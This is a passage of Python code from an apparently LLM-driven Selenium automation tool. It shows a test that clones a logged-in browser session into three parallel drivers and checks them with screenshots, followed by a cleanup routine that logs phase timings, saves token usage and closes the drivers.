        Test function: verify independent driver creation and state cloning.

        Test steps:
        1. Get main driver's current URL (post-login URL)
        2. Create 3 independent drivers
        3. Have each independent driver visit the main driver's current URL
        4. Take screenshots to verify all can access correctly (without re-login)
        5. Clean up all independent drivers

        Usage:
        - Call this function after Phase 1 in run()
        - Check screenshots to confirm login state was correctly cloned
        - Comment out after verification
        """
        self._log("\n" + "="*70)
        self._log("[TEST] Testing independent driver creation")
        self._log("="*70)

        # Import ParallelDriverManager
        try:
            from parallel.parallel_driver_manager import ParallelDriverManager
        except ImportError as e:
            self._log(f"[TEST] ✗ Import failed: {e}")
            self._log("[TEST] Please ensure parallel/parallel_driver_manager.py exists")
            return

        # Check main driver and account_manager
        if not self.driver:
            self._log("[TEST] ✗ Main driver not initialized")
            return

        if not self.account_manager:
            self._log("[TEST] ✗ AccountManager not initialized")
            return

        # Get main driver current URL
        current_url = self.driver.current_url
        self._log(f"[TEST] Main driver current URL: {current_url}")

        # Create test screenshot directory
        test_screenshot_dir = self.output_dir / "test_parallel_drivers"
        test_screenshot_dir.mkdir(parents=True, exist_ok=True)
        self._log(f"[TEST] Screenshot save directory: {test_screenshot_dir}")

        # Main driver screenshot (comparison baseline)
        main_screenshot_path = test_screenshot_dir / "00_main_driver.png"
        try:
            self.driver.save_screenshot(str(main_screenshot_path))
            self._log(f"[TEST] ✓ Main driver screenshot saved: {main_screenshot_path.name}")
        except Exception as e:
            self._log(f"[TEST] ⚠️ Main driver screenshot failed: {e}")

        # Create ParallelDriverManager
        self._log(f"\n[TEST] Creating ParallelDriverManager...")
        try:
            manager = ParallelDriverManager(
                account_manager=self.account_manager,
                base_url=self.initial_url,
                chrome_options=self.chrome_options,
                target_domain=self.target_domain
            )
            self._log(f"[TEST] ✓ ParallelDriverManager created successfully")
        except Exception as e:
            self._log(f"[TEST] ✗ ParallelDriverManager creation failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return

        # Test creating 3 independent drivers
        test_drivers = []
        num_drivers = 3

        self._log(f"\n[TEST] Creating {num_drivers} independent drivers...\n")

        for i in range(1, num_drivers + 1):
            self._log(f"{'='*60}")
            self._log(f"[TEST] Creating independent driver #{i}")
            self._log(f"{'='*60}")

            try:
                # Create cloned driver
                cloned_driver = manager.create_cloned_driver("default_account")
                test_drivers.append(cloned_driver)

                # Navigate to main driver's current URL
                self._log(f"[TEST Driver-{i}] Navigating to target URL: {current_url}")
                cloned_driver.get(current_url)
                time.sleep(1.0)  # wait for page to load

                actual_url = cloned_driver.current_url
                self._log(f"[TEST Driver-{i}] Actual URL: {actual_url}")

                # Check if redirected to login page
                if 'login' in actual_url.lower() and 'login' not in current_url.lower():
                    self._log(f"[TEST Driver-{i}] ⚠️ Warning: redirected to login page!")
                    self._log(f"[TEST Driver-{i}] This may mean login state was not correctly cloned")
                else:
                    self._log(f"[TEST Driver-{i}] ✓ URL correct, not redirected")

                # Take screenshot
                screenshot_path = test_screenshot_dir / f"0{i}_cloned_driver_{i}.png"
                cloned_driver.save_screenshot(str(screenshot_path))
                self._log(f"[TEST Driver-{i}] ✓ Screenshot saved: {screenshot_path.name}")

                self._log(f"[TEST Driver-{i}] ✅ Driver #{i} test complete\n")

            except Exception as e:
                self._log(f"[TEST Driver-{i}] ✗ Failed: {e}")
                import traceback
                self._log(traceback.format_exc())

        # Summarize test results
        self._log(f"\n{'='*70}")
        self._log(f"[TEST] Test summary")
        self._log(f"{'='*70}")
        self._log(f"Successfully created drivers: {len(test_drivers)}/{num_drivers}")
        self._log(f"Screenshot location: {test_screenshot_dir}")
        self._log(f"\nPlease check the following screenshot files:")
        self._log(f"  - 00_main_driver.png (main driver, comparison baseline)")
        for i in range(1, len(test_drivers) + 1):
            self._log(f"  - 0{i}_cloned_driver_{i}.png (independent driver {i})")

        # Clean up all independent drivers
        self._log(f"\n[TEST] Cleaning up independent drivers...")
        manager.cleanup_all()

        self._log(f"{'='*70}")
        self._log(f"[TEST] Test complete!")
        self._log(f"{'='*70}\n")

        # Important notes
        self._log("⚠️  Important: check screenshot files and confirm the following:")
        self._log("   1. Is the page content consistent across all screenshots?")
        self._log("   2. Do independent drivers show the post-login page (not the login page)?")
        self._log("   3. Are there any error messages or abnormal pages?")
        self._log("\n   If all screenshots look correct, independent driver state cloning succeeded!\n")

    def _cleanup(self):
        """Clean up resources"""
        self._log("\n[Resource Cleanup]")

        # Output per-phase timing summary regardless of normal or interrupted exit
        if self.phase_times:
            self._log("\n" + "="*70)
            self._log("⏱️  Per-phase timing summary")
            self._log("="*70)
            for phase, duration in self.phase_times.items():
                self._log(f"  {phase}: {duration:.1f}s")
            self._log(f"  Total: {sum(self.phase_times.values()):.1f}s")
            self._log("="*70)

        # Save token usage regardless of normal or interrupted exit
        try:
            if not getattr(self, '_final_report_saved', False):
                token_usage_path = self.output_dir / "token_usage.json"
                with open(token_usage_path, 'w', encoding='utf-8') as f:
                    json.dump(tracker.get_summary(), f, indent=2, ensure_ascii=False)
                self._log(f"[Cleanup] Token usage saved: {token_usage_path}")
                tracker.print_summary()
        except Exception as e:
            self._log(f"[Cleanup] Failed to save token usage: {e}")

        # Clean up worker drivers (created in Phase 3)
        if self.worker_drivers:
            self._log(f"Cleaning up {len(self.worker_drivers)} worker drivers...")
            for i, worker_driver in enumerate(self.worker_drivers, 1):
                try:
                    # Check if this is the main driver (handled separately below)
                    if worker_driver != self.driver:
                        worker_driver.quit()
                        self._log(f"  [{i}/{len(self.worker_drivers)}] Worker driver closed")
                    else:
                        self._log(f"  [{i}/{len(self.worker_drivers)}] Main driver (skipped, handled below)")
                except Exception as e:
                    self._log(f"  [{i}/{len(self.worker_drivers)}] Close failed: {e}")

        # Close main driver
        if self.driver:
            try:
                self.driver.quit()
                self._log("Main driver closed")
            except Exception as e:
                self._log(f"Main driver close failed: {e}")
